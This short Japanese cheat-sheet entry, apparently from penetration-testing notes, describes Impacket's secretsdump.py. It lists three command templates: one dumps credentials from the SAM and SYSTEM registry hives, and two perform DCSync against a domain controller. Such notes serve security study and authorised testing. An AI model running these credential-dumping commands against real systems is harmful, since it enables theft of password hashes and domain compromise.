# secretsdumpとは
Impacketに含まれる。  
特に認証情報のダンプにおいて、非常に有名で強力なPythonスクリプト。

## コマンド
```bash
impacket-secretsdump.py -sam <SAM> -system <SYSTEM> local # SAMとSYSTEMレジストリから認証情報をダンプ
impacket-secretsdump.py <ドメイン>/<ユーザー>@<ターゲット> # DCSync
impacket-secretsdump.py -just-dc <ドメイン>/<ユーザー>@<ターゲット> # DCSync
``` 
